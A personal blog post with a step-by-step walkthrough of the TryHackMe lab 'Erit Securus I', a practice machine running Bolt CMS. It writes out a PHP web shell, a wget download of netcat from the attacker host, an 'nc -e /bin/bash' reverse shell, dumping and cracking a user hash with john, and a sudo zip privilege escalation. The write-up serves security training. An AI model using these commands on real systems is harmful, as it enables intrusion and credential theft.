<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Erit Securus I is an easy rated difficulty box on TryHackMe. Below are the steps taken to compromise this system.
Task 1    Task 1 just requires you to deploy the box and confirm that you have started it up.
Task 2    Task 2 asks you to scan the box, running nmap -A [machine ip] provides you with the answers to Question 1 and Question 2."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Erit Securus I - TryHackMe"><meta name=twitter:description content="Erit Securus I is an easy rated difficulty box on TryHackMe. Below are the steps taken to compromise this system.
Task 1    Task 1 just requires you to deploy the box and confirm that you have started it up.
Task 2    Task 2 asks you to scan the box, running nmap -A [machine ip] provides you with the answers to Question 1 and Question 2."><meta property="og:title" content="Erit Securus I - TryHackMe"><meta property="og:description" content="Erit Securus I is an easy rated difficulty box on TryHackMe. Below are the steps taken to compromise this system.
Task 1    Task 1 just requires you to deploy the box and confirm that you have started it up.
Task 2    Task 2 asks you to scan the box, running nmap -A [machine ip] provides you with the answers to Question 1 and Question 2."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-07-20-erit-securus/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-07-20T00:00:00+00:00"><meta property="article:modified_time" content="2020-07-20T00:00:00+00:00"><title>Erit Securus I - TryHackMe · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-07-20-erit-securus/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.97.3"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-07-20-erit-securus/>Erit Securus I - TryHackMe</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-07-20T00:00:00Z>July 20, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
4-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/erit-securus-i/>Erit Securus I</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/tryhackme/>TryHackMe</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/pivoting/>pivoting</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/bolt-cms/>bolt cms</a></span></div></div></header><div><p>Erit Securus I is an easy rated difficulty box on <a href=https://www.tryhackme.com>TryHackMe</a>. Below are the steps taken to compromise this system.</p><h3 id=task-1>Task 1
<a class=heading-link href=#task-1><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Task 1 just requires you to deploy the box and confirm that you have started it up.</p><h3 id=task-2>Task 2
<a class=heading-link href=#task-2><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Task 2 asks you to scan the box, running <strong>nmap -A [machine ip]</strong> provides you with the answers to <strong>Question 1</strong> and <strong>Question 2</strong>.</p><p><img src=/assets/img/EritSecurus1.png alt="Erit Securus nmap"></p><h3 id=task-3>Task 3
<a class=heading-link href=#task-3><i class="fa fa-link" aria-hidden=true></i></a></h3><p>There is only one question to answer for this task, which asks you what CMS is being utilized. This can be found by opening up the website in your browser and scrolling to the bottom of the page.</p><p><img src=/assets/img/EritSecurus2.png alt="Erit Securus CMS type"></p><h3 id=task-4>Task 4
<a class=heading-link href=#task-4><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Task 4 asks you to download an <a href=https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py>exploit</a>. <strong>Question 1</strong> asks what language the exploit is coded in. Reviewing the exploit itself tells you what language it is coded in on line 1 of the exploit.</p><p><img src=/assets/img/EritSecurus3.png alt="Erit Securus exploit language"></p><p><strong>Question 2</strong> asks you to find the login page to bolt. This can be found in the exploit on line 44 of the exploit code. You are also provided with credentials to login with in the hint for this question.</p><p><img src=/assets/img/EritSecurus4.png alt="Erit Securus bolt login page"></p><h3 id=task-5>Task 5
<a class=heading-link href=#task-5><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Save the exploit code to your attacker machine. Next, go to the directory where you saved the exploit, and run <strong>python3 exploit.py http://[machine ip] username password</strong>. The username and password were provided in the previous Task&rsquo;s hint. Once connected, run either <strong>whoami</strong> or <strong>id</strong> to get the username to answer <strong>Question 1</strong>.</p><p><img src=/assets/img/EritSecurus5.png alt="Erit Securus bolt exploit"></p><p>Next, follow the steps mentioned in the room to establish a reverse shell. First, run <strong>echo &lsquo;&lt;?php system($_GET[&ldquo;c&rdquo;]);?>&rsquo;>c.php</strong>. This creates a file named <strong>c.php</strong> which you can use to send system commands through.</p><p><img src=/assets/img/EritSecurus6.png alt="Erit Securus c.php"></p><p>Next, open another terminal window on your attacker machine and run <strong>ln -s $(which nc)</strong>. This will be used to link netcat to the current directory.</p><p><img src=/assets/img/EritSecurus7.png alt="Erit Securus netcat link"></p><p>Next, run <strong>python3 -m http.server</strong> to serve up an http server that will be used by the victim machine to pull over netcat.</p><p><img src=/assets/img/EritSecurus8.png alt="Erit Securus python3 http server"></p><p>Next, navigate to <strong>http://[machine ip]/files/c.php?c=whoami</strong> to see if your php file you created a few lines above works as expected, it should return a result of www-data.</p><p><img src=/assets/img/EritSecurus9.png alt="Erit Securus whoami"></p><p>Next, change the command above from whoami to <strong>wget http://[attackerip]:8000/nc</strong>.</p><p><img src=/assets/img/EritSecurus10.png alt="Erit Securus wget nc"></p><p>Nothing will show up in the browser window, but if you look at your python http server, you should see that a file (nc) was transferred to the victim computer.</p><p><img src=/assets/img/EritSecurus11.png alt="Erit Securus wget download nc"></p><p>Create a netcat listener on our attacker pc with <strong>nc -nvlp [port number]</strong>.</p><p><img src=/assets/img/EritSecurus12.png alt="Erit Securus nc listener"></p><p>Now, change the URL on the victim machine from the wget command to <strong>http://[machine ip]/files/c.php?c=chmod 755 nc</strong> to make netcat an executable on the victim machine.</p><p><img src=/assets/img/EritSecurus13.png alt="Erit Securus chmod"></p><p>You will not see any confirmation that the permissions were changed on this file. However, we should now be able to run nc on the victim computer with <strong>http://[machine ip]/files/c.php?c=./nc -e /bin/bash [attacker ip] [port nc is listening on]</strong>. You should now have a connection on your attacker computer.</p><p><img src=/assets/img/EritSecurus14.png alt="Erit Securus bash shell"></p><p>Now, let&rsquo;s get a nicer shell by running <strong>python -c &lsquo;import pty; pty.spawn("/bin/sh")&rsquo;</strong>.</p><p><img src=/assets/img/EritSecurus15.png alt="Erit Securus python shell"></p><h3 id=task-6>Task 6
<a class=heading-link href=#task-6><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Now that we have a reverse shell, run <strong>cd /var/www/html/app/database</strong> to get into the directory the bolt database is in as specified in the directions.</p><p><img src=/assets/img/EritSecurus16.png alt="Erit Securus database"></p><p>Next, run <strong>sqlite3 bolt.db</strong> to open the database. Then run <strong>.tables</strong> to list the tables. Last, let&rsquo;s enumerate the users with <strong>SELECT * from bolt_users;</strong></p><p><img src=/assets/img/EritSecurus17.png alt="Erit Securus database user enumeration"></p><p>We currently have the credentials for admin, but not for wildone. Copy the entire hash (between the second and third | characters) and save it to a file. I saved it to a file named erithashes.txt. Next, run <strong>john erithashes.txt -wordlist=/usr/share/wordlists/rockyou.txt</strong>. This will crack the password for wildone, which is the answer to <strong>Question 1</strong> for this task.</p><p><img src=/assets/img/EritSecurus18.png alt="Erit Securus wildone password"></p><p>Next, follow the provided instructions and run <strong>su wileec</strong> and enter the password you just cracked.</p><p><img src=/assets/img/EritSecurus19.png alt="Erit Securus wileec user"></p><p>Next, type in <strong>cd /home/wileec</strong>, followed by <strong>ls</strong>, and then <strong>cat flag1.txt</strong> to get the answer to <strong>Question 2</strong>.</p><p><img src=/assets/img/EritSecurus20.png alt="Erit Securus flag1.txt"></p><h3 id=task-7>Task 7
<a class=heading-link href=#task-7><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Next, let&rsquo;s follow the directions provided and run <strong>ssh <a href=mailto:wileec@192.168.100.1>wileec@192.168.100.1</a></strong> from our current session as wileec to pivot to another machine.</p><p><img src=/assets/img/EritSecurus21.png alt="Erit Securus ssh"></p><p>Next, run <strong>sudo -l</strong> to see what privileges can be ran as sudo, which is the answer to <strong>Question 1</strong>.</p><p><img src=/assets/img/EritSecurus22.png alt="Erit Securus sudo -l"></p><h3 id=task-8>Task 8
<a class=heading-link href=#task-8><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Lets look at <a href=https://gtfobins.github.io/>GTFOBins</a> to see what ways we can escalate with the command listed in sudo -l. Looking up this command will show you a way to elevate privileges with sudo. Enter the following commands to elevate privileges: <strong>TF=$(mktemp -u)</strong> followed by <strong>sudo -u jsmith zip $TF /etc/hosts -T -TT &lsquo;sh #&rsquo;</strong>.</p><p><img src=/assets/img/EritSecurus23.png alt="Erit Securus gtfobins zip su jsmith"></p><p>Next, run <strong>cd ..</strong> followed by <strong>cd jsmith</strong> to get into jsmith&rsquo;s home directory and then run <strong>ls -al</strong> to list the contents, there is a second flag here. View the flag with <strong>cat flag2.txt</strong>. This is the answer to <strong>Question 1</strong> for Task 8.</p><h3 id=task-9>Task 9
<a class=heading-link href=#task-9><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Let&rsquo;s run <strong>sudo -l</strong> as jsmith and see what commands they can potentially run as root.</p><p><img src=/assets/img/EritSecurus25.png alt="Erit Securus jsmith sudo -l"></p><p>What they can run as sudo is the answer to <strong>Question 1</strong>. Next, there are numerous ways to gain root, but the easiest way is with <strong>sudo su root</strong>. From here run <strong>cd /root</strong> followed by <strong>ls</strong>. Run <strong>cat flag3.txt</strong> to get the final flag and the answer to <strong>Question 2</strong> to finish this challenge!</p><p><img src=/assets/img/EritSecurus26.png alt="Erit Securus flag3.txt"></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2022
Kiel Vaughn</section></footer></main><script src=/js/coder.min.f453d26c79f010446cf0d9770197f77de32c07b7a5512d141a286247fe154a22.js integrity="sha256-9FPSbHnwEERs8Nl3AZf3feMsB7elUS0UGihiR/4VSiI="></script></body></html>